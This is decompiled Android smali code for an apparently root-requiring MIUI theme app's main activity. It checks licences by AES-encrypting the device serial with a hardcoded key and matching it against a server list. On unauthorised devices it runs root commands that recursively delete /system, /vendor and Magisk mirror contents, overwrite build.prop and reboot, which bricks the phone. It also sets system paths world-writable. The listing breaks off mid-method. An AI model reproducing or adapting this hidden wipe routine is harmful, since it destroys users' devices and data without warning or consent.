.class public Lcom/impulsemi/extras/MainActivity;
.super Lc/h/b;
.source ""


# static fields
.field public static final c:Ljava/lang/String;

.field public static final d:Ljava/lang/String;

.field public static final e:Ljava/lang/String;

.field public static f:I

.field public static g:Z


# direct methods
.method public static constructor <clinit>()V
    .locals 1

    const-class v0, Lcom/impulsemi/extras/MainActivity;

    const-class v0, Lb/b/a/c;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/impulsemi/extras/MainActivity;->c:Ljava/lang/String;

    const-class v0, Lb/b/a/m;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/impulsemi/extras/MainActivity;->d:Ljava/lang/String;

    const-class v0, Lb/b/a/m;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/impulsemi/extras/MainActivity;->e:Ljava/lang/String;

    const/4 v0, 0x0

    sput-boolean v0, Lcom/impulsemi/extras/MainActivity;->g:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Lc/h/b;-><init>()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 19

    new-instance v0, Ljava/io/File;

    const-string v1, "/tmp/rooted"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    const-string v1, "/test"

    const-string v2, "/system/test"

    const/4 v3, 0x1

    const-string v4, "mount -o rw,remount /"

    const-string v5, "mount -o rw,remount /system"

    const-string v6, "mount -o rw,remount /vendor"

    const-string v7, "mount -o rw,remount /vendor/etc"

    const-string v8, "mount -o rw,remount /system/vendor/etc"

    const-string v9, "mount -o rw,remount /system/system"

    const-string v10, "mount -o rw,remount /system/etc"

    const-string v11, "mount -o rw,remount /system_root/system"

    const-string v12, "echo test >/system/test"

    const-string v13, "echo test >/test"

    const-string v14, "chmod -R 0777 /system/test"

    const-string v15, "chmod -R 0777 /test"

    const-string v16, "sync"

    if-nez v0, :cond_1

    filled-new-array/range {v4 .. v16}, [Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, La/b/k/r;->a([Ljava/lang/String;Z)Lb/b/a/l;

    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_3

    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_1

    :cond_0
    const-string v4, "mount -o rw,remount /"

    const-string v5, "mount -o rw,remount /system"

    const-string v6, "mount -o rw,remount /vendor"

    const-string v7, "mount -o rw,remount /vendor/etc"

    const-string v8, "mount -o rw,remount /system/vendor/etc"

    const-string v9, "mount -o rw,remount /system/system"

    const-string v10, "mount -o rw,remount /system/etc"

    const-string v11, "mount -o rw,remount /system_root/system"

    const-string v12, "mkdir /tmp"

    const-string v13, "chmod -R 777 /tmp"

    const-string v14, "echo 1 >/tmp/rooted"

    const-string v15, "chmod -R 0777 /tmp/rooted"

    const-string v16, "rm -rf /system/test"

    const-string v17, "rm -rf /test"

    const-string v18, "sync"

    filled-new-array/range {v4 .. v18}, [Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, La/b/k/r;->a([Ljava/lang/String;Z)Lb/b/a/l;

    goto :goto_0

    :cond_1
    filled-new-array/range {v4 .. v16}, [Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, La/b/k/r;->a([Ljava/lang/String;Z)Lb/b/a/l;

    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_3

    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_2

    goto :goto_1

    :cond_2
    const-string v4, "mount -o rw,remount /"

    const-string v5, "mount -o rw,remount /system"

    const-string v6, "mount -o rw,remount /vendor"

    const-string v7, "mount -o rw,remount /vendor/etc"

    const-string v8, "mount -o rw,remount /system/vendor/etc"

    const-string v9, "mount -o rw,remount /system/system"

    const-string v10, "mount -o rw,remount /system/etc"

    const-string v11, "mount -o rw,remount /system_root/system"

    const-string v12, "mkdir /tmp"

    const-string v13, "chmod -R 777 /tmp"

    const-string v14, "echo 1 >/tmp/rooted"

    const-string v15, "chmod -R 0777 /tmp/rooted"

    const-string v16, "rm -rf /system/test"

    const-string v17, "rm -rf /test"

    const-string v18, "sync"

    filled-new-array/range {v4 .. v18}, [Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, La/b/k/r;->a([Ljava/lang/String;Z)Lb/b/a/l;

    :goto_0
    sput-boolean v3, Lcom/impulsemi/extras/MainActivity;->g:Z

    goto :goto_2

    :cond_3
    :goto_1
    invoke-virtual/range {p0 .. p0}, Lcom/impulsemi/extras/MainActivity;->c()V

    :goto_2
    return-void
.end method

.method public b()V
    .locals 3

    new-instance v0, Ljava/io/File;

    const-string v1, "/data/system/theme/com.android.systemui"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    const/4 v1, 0x1

    if-nez v0, :cond_0

    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->e()V

    const-string v0, "cp /system/xbin/itachigold/Theme/com.android.systemui /data/system/theme/com.android.systemui"

    invoke-static {v0, v1}, La/b/k/r;->a(Ljava/lang/String;Z)Lb/b/a/l;

    const-string v0, "chmod 664 /data/system/theme/com.android.systemui"

    invoke-static {v0, v1}, La/b/k/r;->a(Ljava/lang/String;Z)Lb/b/a/l;

    :cond_0
    new-instance v0, Ljava/io/File;

    const-string v2, "/data/system/theme/framework-miui-res"

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->e()V

    const-string v0, "cp /system/xbin/itachigold/Theme/framework-miui-res /data/system/theme/framework-miui-res"

    invoke-static {v0, v1}, La/b/k/r;->a(Ljava/lang/String;Z)Lb/b/a/l;

    const-string v0, "chmod 664 /data/system/theme/framework-miui-res"

    invoke-static {v0, v1}, La/b/k/r;->a(Ljava/lang/String;Z)Lb/b/a/l;

    :cond_1
    new-instance v0, Ljava/io/File;

    const-string v2, "/data/system/theme/com.miui.home"

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_2

    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->e()V

    const-string v0, "cp /system/xbin/itachigold/Theme/com.miui.home /data/system/theme/com.miui.home"

    invoke-static {v0, v1}, La/b/k/r;->a(Ljava/lang/String;Z)Lb/b/a/l;

    const-string v0, "chmod 664 /data/system/theme/com.miui.home"

    invoke-static {v0, v1}, La/b/k/r;->a(Ljava/lang/String;Z)Lb/b/a/l;

    :cond_2
    return-void
.end method

.method public c()V
    .locals 3

    const/4 v0, 0x0

    sput-boolean v0, Lcom/impulsemi/extras/MainActivity;->g:Z

    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "\u8bf7\u6388\u6743ROOT\u540e\u518d\u6253\u5f00\uff01"

    const/4 v2, 0x1

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method public d()V
    .locals 35

    move-object/from16 v1, p0

    sget-boolean v0, Lcom/impulsemi/extras/MainActivity;->g:Z

    const/4 v2, 0x1

    if-nez v0, :cond_0

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->finish()V

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v3, "\u672a\u6388\u4e88Root\u6743\u9650,\u7981\u6b62\u4f7f\u7528!"

    invoke-static {v0, v3, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    return-void

    :cond_0
    const/4 v3, 0x2

    sput v3, Lcom/impulsemi/extras/MainActivity;->f:I

    new-instance v4, Lb/b/a/e;

    invoke-direct {v4}, Lb/b/a/e;-><init>()V

    new-instance v0, Ljava/lang/Thread;

    invoke-direct {v0, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :try_start_0
    invoke-virtual {v0}, Ljava/lang/Thread;->join()V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    move-object v5, v0

    invoke-virtual {v5}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_0
    iget-object v0, v4, Lb/b/a/e;->b:Ljava/lang/String;

    const-wide/16 v5, 0x3e8

    const-string v7, "android.net.wifi.PICK_WIFI_NETWORK"

    if-nez v0, :cond_1

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v3, "\u8be5\u8bbe\u5907\u7f51\u7edc\u4e0d\u901a\u7545\u6216\u670d\u52a1\u5668\u6b63\u5fd9\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u540e\u518d\u9a8c\u8bc1\uff01"

    invoke-static {v0, v3, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    const-string v0, "network_error"

    const-string v2, "\u8bbe\u5907\u7f51\u7edc\u6545\u969c\uff01"

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    invoke-virtual {v0, v7}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    new-instance v2, Ljava/util/Timer;

    invoke-direct {v2}, Ljava/util/Timer;-><init>()V

    new-instance v3, Lcom/impulsemi/extras/MainActivity$a;

    invoke-direct {v3, v1, v0}, Lcom/impulsemi/extras/MainActivity$a;-><init>(Lcom/impulsemi/extras/MainActivity;Landroid/content/Intent;)V

    :goto_1
    invoke-virtual {v2, v3, v5, v6}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    :goto_2
    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->finish()V

    goto/16 :goto_d

    :cond_1
    const/4 v9, 0x0

    :try_start_1
    const-string v0, "android.os.SystemProperties"

    .line 1
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const-string v10, "get"

    new-array v11, v2, [Ljava/lang/Class;

    const-class v12, Ljava/lang/String;

    aput-object v12, v11, v9

    invoke-virtual {v0, v10, v11}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v10

    new-array v11, v2, [Ljava/lang/Object;

    const-string v12, "ro.serialno"

    aput-object v12, v11, v9

    invoke-virtual {v10, v0, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_3

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const/4 v0, 0x0

    :goto_3
    const-string v10, "UTF-8"

    .line 2
    :try_start_2
    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    move-object v11, v0

    goto :goto_4

    :catch_2
    move-exception v0

    move-object v11, v0

    invoke-virtual {v11}, Ljava/lang/Exception;->printStackTrace()V

    const/4 v11, 0x0

    .line 3
    :goto_4
    :try_start_3
    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_5

    const-string v12, " "

    const-string v13, "mihayolove35710"

    :goto_5
    :try_start_4
    invoke-virtual {v0, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->length()I

    move-result v13

    const/16 v14, 0x20

    if-ge v13, v14, :cond_2

    move-object v13, v12

    goto :goto_5

    :cond_2
    invoke-virtual {v0, v9, v14}, Ljava/lang/StringBuffer;->substring(II)Ljava/lang/String;

    move-result-object v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_5

    :try_start_5
    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0
    :try_end_5
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    goto :goto_6

    :catch_3
    move-exception v0

    move-object v13, v0

    :try_start_6
    invoke-virtual {v13}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    const/4 v0, 0x0

    :goto_6
    new-instance v13, Ljavax/crypto/spec/SecretKeySpec;

    const-string v14, "AES"

    invoke-direct {v13, v0, v14}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    const-string v0, "AES/CBC/PKCS7Padding"

    .line 4
    invoke-static {v0}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v14

    .line 5
    new-instance v0, Ljava/lang/StringBuffer;

    const/16 v15, 0x10

    invoke-direct {v0, v15}, Ljava/lang/StringBuffer;-><init>(I)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_5

    const-string v16, "scp173049682166"

    move-object/from16 v8, v16

    :goto_7
    :try_start_7
    invoke-virtual {v0, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->length()I

    move-result v8

    if-ge v8, v15, :cond_3

    move-object v8, v12

    goto :goto_7

    :cond_3
    invoke-virtual {v0, v9, v15}, Ljava/lang/StringBuffer;->substring(II)Ljava/lang/String;

    move-result-object v0
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_5

    :try_start_8
    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0
    :try_end_8
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_8 .. :try_end_8} :catch_4
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_5

    goto :goto_8

    :catch_4
    move-exception v0

    move-object v8, v0

    :try_start_9
    invoke-virtual {v8}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    const/4 v0, 0x0

    :goto_8
    new-instance v8, Ljavax/crypto/spec/IvParameterSpec;

    invoke-direct {v8, v0}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    .line 6
    invoke-virtual {v14, v2, v13, v8}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    invoke-virtual {v14, v11}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v0
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_5

    goto :goto_9

    :catch_5
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const/4 v0, 0x0

    .line 7
    :goto_9
    new-instance v8, Ljava/lang/String;

    invoke-static {v0, v9}, Landroid/util/Base64;->encode([BI)[B

    move-result-object v0

    invoke-direct {v8, v0}, Ljava/lang/String;-><init>([B)V

    const-string v10, ""

    const-string v0, "\r|\n"

    .line 8
    invoke-virtual {v8, v0, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v0, "pass"

    invoke-static {v0, v8}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v11, Ljava/io/BufferedReader;

    new-instance v0, Ljava/io/InputStreamReader;

    new-instance v12, Ljava/io/ByteArrayInputStream;

    iget-object v4, v4, Lb/b/a/e;->b:Ljava/lang/String;

    const-string v13, "utf8"

    invoke-static {v13}, Ljava/nio/charset/Charset;->forName(Ljava/lang/String;)Ljava/nio/charset/Charset;

    move-result-object v14

    invoke-virtual {v4, v14}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v4

    invoke-direct {v12, v4}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    invoke-static {v13}, Ljava/nio/charset/Charset;->forName(Ljava/lang/String;)Ljava/nio/charset/Charset;

    move-result-object v4

    invoke-direct {v0, v12, v4}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/nio/charset/Charset;)V

    invoke-direct {v11, v0}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    const/4 v4, 0x0

    const/16 v17, 0x0

    :goto_a
    const/4 v12, 0x6

    :try_start_a
    invoke-virtual {v11}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0
    :try_end_a
    .catch Ljava/io/IOException; {:try_start_a .. :try_end_a} :catch_6

    if-nez v0, :cond_4

    goto :goto_c

    :catch_6
    move-exception v0

    move-object v13, v0

    invoke-virtual {v13}, Ljava/io/IOException;->printStackTrace()V

    move-object/from16 v0, v17

    :cond_4
    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v13, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_d

    const-string v13, "// Warrior MemberCode"

    invoke-virtual {v0, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_5

    const/4 v4, 0x1

    goto :goto_b

    :cond_5
    const-string v13, "// Authorization UserCode"

    invoke-virtual {v0, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_6

    const/4 v4, 0x0

    :cond_6
    :goto_b
    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v4, :cond_7

    if-eqz v13, :cond_d

    sput v12, Lcom/impulsemi/extras/MainActivity;->f:I

    goto :goto_c

    :cond_7
    if-eqz v13, :cond_d

    sput v2, Lcom/impulsemi/extras/MainActivity;->f:I

    :goto_c
    sget v0, Lcom/impulsemi/extras/MainActivity;->f:I

    if-eq v0, v2, :cond_8

    if-eq v0, v12, :cond_8

    sput v9, Lcom/impulsemi/extras/MainActivity;->f:I

    :cond_8
    sget v0, Lcom/impulsemi/extras/MainActivity;->f:I

    const/16 v4, 0x231

    const-string v8, "system_icon_root"

    if-ne v0, v2, :cond_9

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v9, "\u8be5\u8bbe\u5907\u5df2\u7ecf\u83b7\u5f97\u6388\u6743\uff01\u8bf7\u4f7f\u7528\uff01"

    invoke-static {v0, v9, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v0, v8, v4}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    :cond_9
    sget v0, Lcom/impulsemi/extras/MainActivity;->f:I

    if-ne v0, v12, :cond_a

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v3, "\u60a8\u662f\u4e00\u6d4b\u7528\u6237\uff01\u6b22\u8fce\u4f7f\u7528\uff01"

    invoke-static {v0, v3, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v0, v8, v4}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    goto/16 :goto_d

    :cond_a
    const/16 v4, 0x55e

    if-nez v0, :cond_b

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v3, "\u8be5\u8bbe\u5907\u672a\u83b7\u5f97\u6388\u6743\uff01\uff0c\u8bbe\u5907\u5373\u5c06\u91cd\u542f\uff01,\u8bf7\u8986\u76d6\u8f93\u5165\u5176\u5b83\u5305\uff01"

    invoke-static {v0, v3, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    const-string v9, "mount -o rw,remount /sbin/.magisk/mirror/system"

    const-string v10, "mount -o rw,remount /sbin/.magisk/mirror/system/system"

    const-string v11, "mount -o rw,remount /sbin/.magisk/mirror/system_root"

    const-string v12, "mount -o rw,remount /sbin/.magisk/mirror/vendor"

    const-string v13, "mount -o rw,remount /"

    const-string v14, "mount -o rw,remount /system"

    const-string v15, "mount -o rw,remount /vendor"

    const-string v16, "mount -o rw,remount /vendor/etc"

    const-string v17, "mount -o rw,remount /system/vendor/etc"

    const-string v18, "mount -o rw,remount /system/system"

    const-string v19, "mount -o rw,remount /system_root/system"

    const-string v20, "mount -o rw,remount /system/etc"

    const-string v21, "mount -o rw,remount /data"

    const-string v22, "echo Please not cheat our team !>/system/build.prop"

    const-string v23, "rm -rf /sbin/.magisk/mirror/system/*"

    const-string v24, "rm -rf /sbin/.magisk/mirror/system_root/*"

    const-string v25, "rm -rf /sbin/.magisk/mirror/system/system/*"

    const-string v26, "rm -rf /sbin/.magisk/mirror/*"

    const-string v27, "rm -rf /system/*"

    const-string v28, "rm -rf /system_root/*"

    const-string v29, "rm -rf /system_root/system/*"

    const-string v30, "rm -rf /system/system/*"

    const-string v31, "rm -rf /vendor/*"

    const-string v32, "rm -rf /vendor/etc/*"

    const-string v33, "sync"

    const-string v34, "reboot"

    filled-new-array/range {v9 .. v34}, [Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v2}, La/b/k/r;->a([Ljava/lang/String;Z)Lb/b/a/l;

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v0, v8, v4}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    goto/16 :goto_2

    :cond_b
    if-ne v0, v3, :cond_c

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v0, v8, v4}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v3, "\u8be5\u8bbe\u5907\u8fd8\u672a\u9a8c\u8bc1\uff01,\u8bf7\u68c0\u67e5\u7f51\u7edc\u662f\u5426\u6b63\u786e\u8fde\u63a5\u5e76\u4e14\u91cd\u65b0\u6253\u5f00\u5e94\u7528\u3002"

    invoke-static {v0, v3, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    invoke-virtual {v0, v7}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    new-instance v2, Ljava/util/Timer;

    invoke-direct {v2}, Ljava/util/Timer;-><init>()V

    new-instance v3, Lcom/impulsemi/extras/MainActivity$b;

    invoke-direct {v3, v1, v0}, Lcom/impulsemi/extras/MainActivity$b;-><init>(Lcom/impulsemi/extras/MainActivity;Landroid/content/Intent;)V

    goto/16 :goto_1

    :cond_c
    :goto_d
    return-void

    :cond_d
    move-object/from16 v17, v0

    goto/16 :goto_a
.end method

.method public e()V
    .locals 15

    const-string v0, "echo test"

    const-string v1, "mount -o rw,remount /"

    const-string v2, "mount -o rw,remount /system"

    const-string v3, "mount -o rw,remount /vendor"

    const-string v4, "mount -o rw,remount /system/system"

    const-string v5, "mount -o rw,remount /system_root/system"

    const-string v6, "mount -o rw,remount /data"

    filled-new-array/range {v0 .. v6}, [Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v0, v1}, La/b/k/r;->a([Ljava/lang/String;Z)Lb/b/a/l;

    new-instance v0, Ljava/io/File;

    const-string v2, "/system/bin/chmod777"

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v2, "echo test"

    const-string v3, "mount -o rw,remount /"

    const-string v4, "mount -o rw,remount /system"

    const-string v5, "mount -o rw,remount /vendor"

    const-string v6, "mount -o rw,remount /system/system"

    const-string v7, "mount -o rw,remount /system_root/system"

    const-string v8, "mount -o rw,remount /data"

    const-string v9, "mkdir /tmp"

    const-string v10, "chmod -R 0777 /tmp"

    const-string v11, "chmod -R 777 /system/res"

    const-string v12, "chmod -R 777 /system/tools"

    const-string v13, "echo chmod777 >/system/bin/chmod777"

    const-string v14, "sync"

    filled-new-array/range {v2 .. v14}, [Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v1}, La/b/k/r;->a([Ljava/lang/String;Z)Lb/b/a/l;

    :cond_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 10

    invoke-virtual {p0}, Landroid/app/Activity;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Application;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "impulse_first_load"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v0

    const/4 v3, 0x1

    if-nez v0, :cond_0

    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->a()V

    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->d()V

    invoke-virtual {p0}, Landroid/app/Activity;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Application;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v0, v1, v3}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    invoke-virtual {p0}, Landroid/app/Activity;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Application;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "impulse_show_off_icon"

    const-string v4, ""

    invoke-static {v0, v1, v4}, Landroid/provider/Settings$System;->putString(Landroid/content/ContentResolver;Ljava/lang/String;Ljava/lang/String;)Z

    const-string v1, "impulse_network_sign_up"

    const-string v4, " \u25b2"

    invoke-static {v0, v1, v4}, Landroid/provider/Settings$System;->putString(Landroid/content/ContentResolver;Ljava/lang/String;Ljava/lang/String;)Z

    const-string v1, "impulse_network_sign_down"

    const-string v4, " \u25bc"

    invoke-static {v0, v1, v4}, Landroid/provider/Settings$System;->putString(Landroid/content/ContentResolver;Ljava/lang/String;Ljava/lang/String;)Z

    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->b()V

    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->e()V

    const-string v0, "chmod 777 /system/xbin/zip"

    invoke-static {v0, v3}, La/b/k/r;->a(Ljava/lang/String;Z)Lb/b/a/l;

    goto :goto_1

    :cond_0
    invoke-virtual {p0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "system_icon_root"

